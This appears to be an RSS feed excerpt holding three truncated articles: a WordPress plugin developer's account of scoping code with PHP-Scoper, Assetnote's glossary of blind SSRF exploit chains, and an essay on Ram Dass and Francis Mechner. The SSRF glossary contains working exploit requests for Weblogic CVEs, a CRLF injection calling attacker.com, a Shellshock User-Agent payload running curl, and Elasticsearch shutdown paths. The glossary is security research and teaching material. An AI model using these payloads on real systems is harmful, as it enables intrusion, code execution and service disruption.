href="https://graphql-api.com/">graphql-api.com</a>, and launched it 2 weeks ago (yay! 🥳 Btw, how do you like it? Be welcome to give me feedback, via <a href="https://twitter.com/losoviz/">DM</a> or <a href="mailto:leo@getpop.org">email</a>)</li><li>3 days ago, I finally started scoping the plugin, and finished this task yesterday! (At 3 am, but it was worth it 😅)</li><li>And finally, I'm already working on the upcoming version <code>0.8</code>, which will be the first one available in the plugin repository</li></ul><p>Scoping the plugin is mandatory to upload it to the repository, because otherwise it could conflict with a different plugin, which requires the same dependency as my plugin, but with a different version. Having done it is a really big milestone; no other development is as important. For instance, I must still complete the GraphQL schema to fully match the WordPress data model, but that will be done steadily on each new release.</p><p>So in a few weeks from now, the plugin will show up when searching for "GraphQL", and the people who are actually needing to implement a GraphQL API will get to know of my plugin's existence.</p><p>Indeed, I do want my plugin to be seriously considered for the future of WordPress. I've been working on it for several years now. <a href="https://github.com/leoloso/PoP">The repo</a> was started back in August 2016; that is even before WPGraphQL existed, and at the beginning of GraphQL. But I didn't know that the project would become a GraphQL server; it took that direction only around 1.5 years ago.</p><p>(The project is actually a framework to build applications using server-side components, and a GraphQL server could perfectly be built using this architecture. So then I just built it).</p><p>WPGraphQL is an established plugin, and rightly so: it was started a few years ago, and a community was built around it. The work by <a href="https://twitter.com/jasonbahl">Jason Bahl</a> (who is employed by Gatsby) and <a href="https://github.com/wp-graphql/wp-graphql/graphs/contributors">the contributors to his project</a> has been outstanding: integrating WordPress into the Jamstack is now easier than ever.</p><p>But one thing is Gatsby and the Jamstack, and another thing is WordPress. WordPress is 40% of the web, not just an input to a static site generator.</p><p>So now, we can consider if WPGraphQL is the right option, without having this decision taken for us out of lack of alternatives. We can now analyze both plugins to see whose goals are more aligned to what's important for WordPress.</p><p>The GraphQL API for WordPress can also work with the Jamstack. But its main objectives are, I believe, more splendid: To "democratize data publishing", so that editing an API becomes as easy as editing a post (something everyone can do), and to make WordPress become the OS of the web.</p><p>Once the plugin is available on the repository, I hope more people will try it out and say "Hey, this is so friking awesome! How comes I didn't know about this stuff before?".</p><p>And then, the choice of "the GraphQL plugin" is not pre-determined, and the WordPress community can consider both WPGraphQL and the GraphQL API for WordPress based on their own merits.</p><p>Now that my motivations are out of the way, let's talk technical stuff 🤓.</p><h2 id="heading-checking-out-the-options">Checking out the options<a href="#heading-checking-out-the-options"><span> permalink</span></a></h2><p>Scoping a plugin involves running some tooling, that takes the plugin code as input, and spits out the scoped plugin. No big deal, right? How hard can that be?</p><p><img src="https://graphql-api.com/images/dog-scope-plugin.jpg" alt="Talking technical" loading="lazy" width="505" height="494"></p><p>Well, depending on the codebase, just executing the scope command alone won't be enough. After that, we need to check for errors in the console, fix them, test the application thoroughly, identify errors and why they happen, fix them, and iterate. To get it completely right, it might require some time.</p><p>There are 2 libraries for scoping, which have different goals:</p><ul><li><a href="https://github.com/coenjacobs/mozart">Mozart</a>, for WordPress code</li><li><a href="https://github.com/humbug/php-scoper">PHP-Scoper</a>, for any PHP code, particularly when producing PHARs</li></ul><p>Because I have a WordPress plugin, I tried out Mozart first. Let's see how it fared.</p><h2 id="heading-trying-out-mozart-and-failing">Trying out Mozart, and failing<a href="#heading-trying-out-mozart-and-failing"><span> permalink</span></a></h2><p>I tried Mozart around 1 year ago. For what it says in the documentation, "the <code>mozart compose</code> command does all the magic". So I expected it all to be very quick and simple, and go enjoy a daiquiri for the rest of the day.</p><p>Alas, Mozart never worked for my codebase. It kept running into issues, so the scoping never materialized. And I couldn't get the required assistance: I submitted a PR, but <a href="https://github.com/coenjacobs/mozart/pull/36#issuecomment-633013728">it was not considered for merging</a>, and I was not even notified about it, so I kept waiting until I naturally lost interest in this project.</p><p>I believe that Mozart couldn't handle some of the dependencies in my plugin. I'm making use of several of Symfony's components, including <a href="https://symfony.com/doc/current/components/dependency_injection.html">DependencyInjection</a>, <a href="https://symfony.com/doc/current/components/cache.html">Cache</a> and <a href="https://github.com/symfony/dotenv">Dotenv</a>, with everything managed through Composer.</p><p>Scoping PHP is not just about PHP, so the scoper will have many hurdles to avoid and challenges to solve. For instance, Symfony DependencyInjection uses <code>YAML</code> files to set-up configuration, and these must be scoped too. And the <code>composer.json</code> file contains the configuration for <code>PSR-4</code> autoloading, and this must be scoped too. And, I believe, Mozart couldn't handle these complexities properly.</p><p>But I'm sure that my experience is not the only one, and that there are many happy users our there. Also, my failed attempt happened 1 year ago, so I wonder if the tool has been improved since then. And then, don't forget the saying: "All scoped plugins are alike; each unscoped plugin is unscoped in its own way", so possibly it fails just for me.</p><p>If your WordPress plugin is simple, with self-contained logic, and scoping must be performed within PHP code only, then chances are that Mozart will work. You just gotta find out.</p><h2 id="heading-checking-php-scoper-and-coming-out-in-panic">Checking PHP-Scoper, and coming out in panic<a href="#heading-checking-php-scoper-and-coming-out-in-panic"><span> permalink</span></a></h2><p>So I headed for PHP-Scoper. However, I never even tried to try it, because I got frightened immediately by it.</p><p>To start with, <a href="https://github.com/humbug/php-scoper#wordpress">this tool does not naturally support WordPress</a>. And to continue, they recommend to take a look at <a href="https://github.com/humbug/php-scoper/blob/master/Makefile">their own Makefile</a>, which looks like this:</p><pre><code><span></span><br><span>MAKEFLAGS <span>+=</span> --warn-undefined-variables</span><br><span>MAKEFLAGS <span>+=</span> --no-builtin-rules</span><br><span></span><br><span>.DEFAULT_GOAL :<span>=</span> <span>help</span></span><br><span></span><br><span><span>PHPBIN</span><span>=</span>php</span><br><span><span>PHPNOGC</span><span>=</span>php -d zend.enable_gc<span>=</span><span>0</span></span><br><span><span>IS_PHP8</span><span>=</span><span><span>$(</span>shell php -r <span>"echo version_compare(PHP_VERSION, '8.0.0', '&gt;=') ? 'true' : 'false';"</span><span>)</span></span></span><br><span></span><br><span><span>SRC_FILES</span><span>=</span><span><span>$(</span>shell <span>find</span> bin/ src/ -type f<span>)</span></span></span><br><span></span><br><span>.PHONY: <span>help</span></span><br><span>help:</span><br><span>	@echo <span>"<span title="\033">\033</span>[33mUsage:<span title="\033">\033</span>[0m<span title="\n">\n</span>  make TARGET<span title="\n">\n</span><span title="\n">\n</span><span title="\033">\033</span>[32m#<span title="\n">\n</span># Commands<span title="\n">\n</span>#---------------------------------------------------------------------------<span title="\033">\033</span>[0m<span title="\n">\n</span>"</span></span><br><span>	@fgrep -h <span>"##"</span> <span><span>$(</span>MAKEFILE_LIST<span>)</span></span> <span>|</span> <span>fgrep</span> -v <span>fgrep</span> <span>|</span> <span>sed</span> -e <span>'s/<span title="\\">\\</span><span>$$</span>//'</span> <span>|</span> <span>sed</span> -e <span>'s/##//'</span> <span>|</span> <span>awk</span> <span>'BEGIN {FS = ":"}; {printf "<span title="\033">\033</span>[33m%s:<span title="\033">\033</span>[0m%s<span title="\n">\n</span>", <span>$$</span>1, <span>$$</span>2}'</span></span><br><span></span><br><span></span><br><span></span><br><span></span><br><span></span><br><span></span><br><span>.PHONY: clean</span><br><span>clean:	 </span><br><span>clean:</span><br><span>	<span>git</span> clean --exclude<span>=</span>.idea/ -ffdx</span><br><span></span><br><span>update-root-version: </span><br><span>update-root-version:</span><br><span>	<span>rm</span> .composer-root-version <span>||</span> <span>true</span></span><br><span>	<span><span>$(</span>MAKE<span>)</span></span> .composer-root-version</span></code></pre><p>And 600 more lines, all like this. It looks like a riddle. Believing that I needed to understand that code just to scope my plugin, made me flee unceremoniously.</p><p>(Well, understanding that code is their recommendation to test the scoped application, but it is not required. We can also just run the command <code>php-scoper add-prefix</code>, let it do all the magic, and go drink our daiquiris.)</p><h2 id="heading-coming-back-to-php-scoper-this-time-for-good">Coming back to PHP-Scoper, this time for good<a href="#heading-coming-back-to-php-scoper-this-time-for-good"><span> permalink</span></a></h2><p>So, 3 days ago, I took a decision to implement scoping, somehow. I had to make it happen.</p><p>I came back to PHP-Scoper, to try it out in earnest. I knew that WordPress could be scoped with it from reading <a href="https://deliciousbrains.com/php-scoper-namespace-composer-depencies/">PHP Scoper: How to Avoid Namespace Issues in your Composer Dependencies</a> (by the brilliant folks from Delicious Brains). It was just a matter of attitude, and perseverence.</p><p>I explored some of the existing solutions, including:</p><ul><li><a href="https://github.com/humbug/php-scoper/issues/442#issuecomment-736598602">This one</a> by Lucas Bustamante</li><li><a href="https://github.com/Yoast/wordpress-seo/blob/11.3/src/config/dependency-management.php">This one</a> by Yoast</li><li><a href="https://github.com/google/site-kit-wp/blob/80e3bd88317bf20bc5e5d6600428692fa8e3fc08/includes/loader.php">This one</a> by Google Site Kit</li><li><a href="https://github.com/google/web-stories-wp/blob/main/scoper.inc.php">This one</a> by Google Web Stories</li></ul><p>But they all look not fully satisfying to me: either the code seems hacky, or fragile and waiting to break at some time or another.</p><p>For instance, the Google Web Stories plugin scopes the code, and then reverts back each one of the conflicts:</p><pre><code><span><span>return</span> <span>[</span></span><br><span>  <span>'patchers'</span>                   <span>=&gt;</span> <span>[</span></span><br><span>		<span>function</span> <span>(</span> <span>$file_path</span><span>,</span> <span>$prefix</span><span>,</span> <span>$contents</span> <span>)</span> <span>{</span></span><br>			<br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\_doing_it_wrong"</span><span>,</span> <span>'\\_doing_it_wrong'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\__"</span><span>,</span> <span>'\\__'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_html_e"</span><span>,</span> <span>'\\esc_html_e'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_html"</span><span>,</span> <span>'\\esc_html'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_attr"</span><span>,</span> <span>'\\esc_attr'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_url"</span><span>,</span> <span>'\\esc_url'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>      <span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\do_action"</span><span>,</span> <span>'\\do_action'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>      </span><br><span>    <span>}</span></span><br><span>  <span>]</span></span><br><span><span>]</span></span></code></pre><p>I understand why they do it, but I don't like it. Whenever a new WordPress function gets referenced, they need to make sure it also makes it to this list. It's too manual, too fragile.</p><p>So this was my challenge: Isn't there a simpler way to scope a plugin, and relying on code that we can present to our friends and colleagues …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://graphql-api.com/blog/graphql-api-for-wp-is-now-scoped-thanks-to-php-scoper/">https://graphql-api.com/blog/graphql-api-for-wp-is-now-scoped-thanks-to-php-scoper/</a></em></p>]]>
            </description>
            <link>https://graphql-api.com/blog/graphql-api-for-wp-is-now-scoped-thanks-to-php-scoper/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25970511</guid>
            <pubDate>Sat, 30 Jan 2021 16:42:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Glossary of Blind SSRF Chains]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25970499">thread link</a>) | @simonpure
<br/>
January 30, 2021 | https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ | <a href="https://web.archive.org/web/*/https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/blind-ssrf-chains.png" alt="" width="80%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>&nbsp;</td>
    </tr>
  </tbody>
</table>


<h2 id="what-is-server-side-request-forgery-ssrf">What is Server Side Request Forgery (SSRF)?</h2>

<p>Server Side Request Forgery occurs when you can coerce a server to make arbitrary requests on your behalf. As the requests are being made by the server, it may be possible to access internal resources due to where the server is positioned in the network. On cloud environments, SSRF poses a more significant risk due to the presence of <a href="https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b">metadata endpoints</a> that may contain sensitive credentials or secrets.</p>

<h2 id="blind-ssrf">Blind SSRF</h2>

<p>When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. In the industry, this behaviour is often referred to as “Blind SSRF”. In such situations, how do we prove impact? This was an interesting discussion that was sparked by Justin Gardner on Twitter:</p>

<blockquote data-theme="dark"><p lang="en" dir="ltr">I've been finding a large amount of Blind SSRFs recently. What kind of one-shot RCE's have you guys used as pivots for these in the past? I've got access to some Kafka and a bunch of other things. <a href="https://twitter.com/nnwakelam?ref_src=twsrc%5Etfw">@nnwakelam</a> <a href="https://twitter.com/thedawgyg?ref_src=twsrc%5Etfw">@thedawgyg</a></p>— Justin Gardner (@Rhynorater) <a href="https://twitter.com/Rhynorater/status/1349290375312154625?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>


<p>If you can reach internal resources, there are a number of potential exploit chains that can be executed to prove impact. This blog post attempts to go into detail for each known exploit chain when leveraging blind SSRF, and will be updated as more techniques are discovered and shared.</p>

<p>You can find a GitHub repo with all of these techniques here: <a href="https://github.com/assetnote/blind-ssrf-chains">Blind SSRF Chains</a>.</p>

<p>Please send us a pull request on GitHub if you would like any more techniques to be added to this glossary.</p>

<h2 id="ssrf-canaries">SSRF Canaries</h2>

<blockquote data-conversation="none" data-theme="dark"><p lang="en" dir="ltr">I tend to call them SSRF canaries, when chaining a blind SSRF to another SSRF internally which makes an additional call externally, or by an app-specific open redir or blind XXE. Confluence, Artifactory, Jenkins and JAMF have some that works well.</p>— Frans Rosén (@fransrosen) <a href="https://twitter.com/fransrosen/status/1349397387920502786?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>


<p>In order to validate that you can interact with internal services or applications, you can utilise “SSRF canaries”.</p>

<p>This is when we can request an internal URL that performs another SSRF and calls out to your canary host. If you receive a request to your canary host, it means that you have successfully hit an internal service that is also capable making outbound requests.</p>

<p>This is an effective way to verify that an SSRF vulnerability has access to a internal networks or applications, and to also verify the presence of certain software existing on the internal network. You can also potentially pivot to more sensitive parts of an internal network using an SSRF canary, depending on where it sits.</p>

<h2 id="using-dns-datasources-and-altdns-to-find-internal-hosts">Using DNS datasources and AltDNS to find internal hosts</h2>

<p>With the goal being to find as many internal hosts as possible, DNS datasources can be utilised to find all records that point to internal hosts.</p>

<p>On cloud environments, we often see ELBs that are pointing to hosts inside an internal VPC. Depending on which VPC the asset you’re targeting is in, it may be possible to access other hosts within the same VPC.</p>

<p>For example, consider the following host has been discovered from DNS datasources:</p>

<pre><code>livestats.target.com -&gt; internal-es-livestats-298228113.us-west-2.elb.amazonaws.com -&gt; 10.0.0.82
</code></pre>

<p>You can make an assumption that the <code>es</code> stands for Elasticsearch, and then perform further attacks on this host. You can also spray all of these blind SSRF payloads across all of the “internal” hosts that have been identified through this method. This is often effective.</p>

<p>To find more internal hosts, I recommend taking all of your DNS data and then using something like <a href="https://github.com/infosec-au/altdns">AltDNS</a> to generate permutations and then resolve them with a <a href="https://github.com/blechschmidt/massdns">fast DNS bruteforcer</a>.</p>

<p>Once this is complete, identify all of the newly discovered internal hosts and use them as a part of your blind SSRF chain.</p>

<h2 id="side-channel-leaks">Side Channel Leaks</h2>

<p>When exploiting blind SSRF vulnerabilities, you may be able to leak some information about the response being returned. For example, let’s say that you have blind SSRF via an XXE, the error messages may indicate whether or not:</p>

<ul>
  <li>A response was returned</li>
</ul>

<p><code>Error parsing request: System.Xml.XmlException: Expected DTD markup was not found. Line 1, position 1.</code></p>

<p>vs.</p>

<ul>
  <li>Host and port are unreachable</li>
</ul>

<p><code>Error parsing request: System.Net.WebException: Unable to connect to the remote server</code></p>

<p>Similarly, outside of XXEs, a web application could also have a side channel leak that can be ascertained by inspecting differences within the:</p>

<ul>
  <li><strong>Response status code</strong>:</li>
</ul>

<p>Online internal asset:port responds with <code>200 OK</code> vs offline internal asset:port <code>500 Internal Server Error</code></p>

<ul>
  <li><strong>Response contents</strong>:</li>
</ul>

<p>The response size in bytes is smaller or bigger depending on whether or not the URL you are trying to request is reachable.</p>

<ul>
  <li><strong>Response timing</strong>:</li>
</ul>

<p>The response times are slower or faster depending on whether or not the URL you are trying to request is reachable.</p>

<hr>


<p><strong>Possible via HTTP(s)</strong></p>

<ul>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#elasticsearch">Elasticsearch</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#weblogic">Weblogic</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#consul">Hashicorp Consul</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#shellshock">Shellshock</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#druid">Apache Druid</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#solr">Apache Solr</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#peoplesoft">PeopleSoft</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#struts">Apache Struts</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#jboss">JBoss</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#confluence">Confluence</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#jira">Jira</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#atlassian-products">Other Atlassian Products</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#opentsdb">OpenTSDB</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#jenkins">Jenkins</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#hystrix">Hystrix Dashboard</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#w3">W3 Total Cache</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#docker">Docker</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#redisexporter">Gitlab Prometheus Redis Exporter</a></li>
</ul>

<p><strong>Possible via Gopher</strong></p>

<ul>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#redis">Redis</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#memcache">Memcache</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#tomcat">Apache Tomcat</a></li>
</ul>

<p><strong>Tools</strong></p>

<ul>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#gopherus">Gopherus</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#ssrfproxy">SSRF Proxy</a></li>
</ul>

<hr>

<p><strong>Possible via HTTP(s)</strong></p>



<h2 id="elasticsearch">Elasticsearch</h2>

<p><strong>Commonly bound port: 9200</strong></p>

<p>When Elasticsearch is deployed internally, it usually does not require authentication.</p>

<p>If you have a partially blind SSRF where you can determine the status code, check to see if the following endpoints return a 200:</p>

<pre><code>/_cluster/health
/_cat/indices
/_cat/health
</code></pre>

<p>If you have a blind SSRF where you can send POST requests, you can shut down the Elasticsearch instance by sending a POST request to the following path:</p>

<p>Note: the <code>_shutdown</code> API has been removed from Elasticsearch version 2.x. and up. This only works in Elasticsearch 1.6 and below:</p>

<pre><code>/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
</code></pre>



<h2 id="weblogic">Weblogic</h2>

<p><strong>Commonly bound ports: 80, 443 (SSL), 7001, 8888</strong></p>

<p><strong>SSRF Canary: UDDI Explorer (CVE-2014-4210)</strong></p>

<pre><code>POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&amp;rdoSearch=name&amp;txtSearchname=test&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search
</code></pre>

<p>This also works via GET:</p>

<pre><code>http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&amp;rdoSearch=name&amp;txtSearchname=test&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search
</code></pre>

<p>This endpoint is also vulnerable to CRLF injection:</p>

<pre><code>GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
</code></pre>

<p>Will result in the following request:</p>

<pre><code><a href="https://blog.assetnote.io/cdn-cgi/l/email-protection" data-cfemail="c3b1acacb783aea2aaaf">[email&nbsp;protected]</a>:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;env:Header/&gt;&lt;env:Body&gt;&lt;find_business generic="2.0" xmlns="urn:uddi-org:api_v2"&gt;&lt;name&gt;sdf&lt;/name&gt;&lt;/find_business&gt;&lt;/env:Body&gt;&lt;/env:Envelope&gt;
</code></pre>

<p><strong>SSRF Canary: CVE-2020-14883</strong></p>

<p>Taken from <a href="https://forum.90sec.com/t/topic/1412">here</a>.</p>

<p>Linux:</p>

<pre><code>POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
</code></pre>

<p>Windows:</p>

<pre><code>POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
</code></pre>



<h2 id="hashicorp-consul">Hashicorp Consul</h2>

<p><strong>Commonly bound ports: 8500, 8501 (SSL)</strong></p>

<p>Writeup can be found <a href="https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html">here</a>.</p>



<h2 id="shellshock">Shellshock</h2>

<p><strong>Commonly bound ports: 80, 443 (SSL), 8080</strong></p>

<p>In order to effectively test for Shellshock, you may need to add a header containing the payload. The following CGI paths are worth trying:</p>

<p>Short list of CGI paths to test:</p>

<p><a href="https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4">Gist containing paths</a>.</p>

<p><strong>SSRF Canary: Shellshock via User Agent</strong></p>

<pre><code>User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
</code></pre>



<h2 id="apache-druid">Apache Druid</h2>

<p><strong>Commonly bound ports: 80, 8080, 8888, 8082</strong></p>

<p>See the API reference for Apache Druid <a href="https://druid.apache.org/docs/latest/operations/api-reference.html">here</a>.</p>

<p>If you can view the status code, check the following paths to see if they return a 200 status code:</p>

<pre><code>/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
</code></pre>

<p>Shutdown tasks, requires you to guess task IDs or …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/</a></em></p>]]>
            </description>
            <link>https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25970499</guid>
            <pubDate>Sat, 30 Jan 2021 16:41:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Oneness via gurus, psychedelics and the hidden code in Jordan Mechner's Karateka]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25970184">thread link</a>) | @schmudde
<br/>
January 30, 2021 | https://schmud.de/posts/2020-12-16-be-here-now.html | <a href="https://web.archive.org/web/*/https://schmud.de/posts/2020-12-16-be-here-now.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody" role="main"><p>A reflection on Ram Dass’ 1971 classic, <em>Be Here Now</em>, and the book’s connection to information and our state of being.</p>

<p>Like many who walk the hallways of elite institutions, Ram Dass’ life intersected with influential mid-century thinkers and doers. His most famous collaborator might have been Timothy Leary in the early 1960s. Their landmark studies of psychedelic drugs lead to his dismissal from Harvard in 1963.</p>
<p>Ram Dass’ association with David Padwa is of more immediate interest to me. Padwa established a company called Basic Systems and became a millionaire by the time he met the young author in the late 1960s.<span><label for="sn-0"></label><span>From David Padwa’s <a href="http://www.cuke.com/people/padwa.htm">Curriculum Vitae</a>: “1960-1965. Founder and CEO of Basic Systems Inc.&nbsp;Principal offices in Cambridge, New York, Chicago, Pasadena, and Washington, DC. Firm specialized in educational and curricular technologies as well as the provision of systems integration services in education and training markets. In 1964 Xerox Corporation acquired Basic Systems; continued as division executive at Xerox and Director of Planning for educational markets.”</span></span> Basic Systems automated employee training and student education, often integrating into an institution’s existing computer infrastructure.</p>
<p>The company caught the eye of Xerox Corporation and was soon acquired. It fit nicely with Xerox’s growing digital portfolio. As the copier company sought to establish the office of the future, it would soon acquire the influential minicomputer manufacturer <a href="https://www.computerhistory.org/revolution/minicomputers/11/340">Scientific Data Systems</a> and establish the legendary <a href="https://en.wikipedia.org/wiki/PARC_(company)">Xerox PARC</a>.</p>
<figure>
<img src="https://schmud.de/img/2020-12-16-be-here-now/karateka-2.png" alt="Karateka Atari 7800 (1988)"> <em>Karateka</em> Atari 7800 (1988) <i></i> <a href="https://boardgamegeek.com/images/thing/77183/karateka-1984">Board Game Geek</a>
</figure>
<p>Padwa founded Basic Systems with the influential psychologist Francis Mechner. I was first exposed to Francis Mechner as a child playing <em>Karateka</em> (1984) on my Atari 7800<span><label for="sn-1"></label><span>The original version was written by Jordan Mechner and published by Broderbund in 1984. The Atari 7800 version was written by Jack Sandberg, Sr.&nbsp;at Ibid Inc.&nbsp;and published by Atari in 1987.</span></span> and then later <em>Prince of Persia</em> (1989) on my family’s PC. Francis Mechner was the composer for these games, both written by his son <a href="http://jordanmechner.com/">Jordan Mechner</a>. The elder Mechner is something of a renaissance man: starting several successful businesses, speaking five languages, publishing cross-disciplinary theoretical insights, performing as a concert pianist, and achieving a 5-dan rating in Go.<span><label for="sn-2"></label><span>Padwa and Mechner’s company also published the <a href="https://books.google.it/books?id=TnVYAAAAYAAJ&amp;redir_esc=y">original edition</a> of “Bobby Fischer Teaches Chess” in 1966. The best-selling book is still in print today.</span></span></p>
<p>These characters provide a sampling of the environment that nurtured Ram Dass. He would soon leave these comforts to join Padwa and his Land Rover on a road trip from Tehran to India in search of a spiritual awakening.</p>
<p>Ram Dass ultimately stayed in India for some time (as did Padwa’s Land Rover), leading to the insights that birthed the book <em>Be Here Now</em>. This book’s influence is without question. It was a significant contributor to the American counterculture movement and a starting point for many Western practitioners of Buddhism and Yoga.</p>

<figure>
